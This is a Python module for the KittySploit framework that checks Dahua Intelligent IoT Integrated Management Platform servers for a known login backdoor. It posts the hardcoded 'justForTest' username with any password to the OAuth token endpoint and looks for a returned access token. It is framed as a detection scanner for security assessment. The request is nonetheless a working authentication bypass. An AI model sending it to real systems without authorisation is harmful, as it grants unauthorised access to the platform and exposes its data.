#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a vulnerability in the user login interface /evo-apigw/evo-oauth/oauth/token of Zhejiang Dahua Techno."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dahua Intelligent IoT - Information Disclosure Detection',
        'description': 'There is a vulnerability in the user login interface /evo-apigw/evo-oauth/oauth/token of Zhejiang Dahua Technology Co., Ltd. Intelligent IoT Integrated Management Platform. Users can successfully log in to the platform using justForTest/any password, causing information leakage.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'dahua', 'exposure', 'backdoor', 'bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    def run(self):
        path = '/evo-apigw/evo-oauth/oauth/token'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"success":', '"access_token":', '"token_type":', 'magicId',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Dahua Intelligent IoT - Information Disclosure detected', path=path)
            return True
        return False

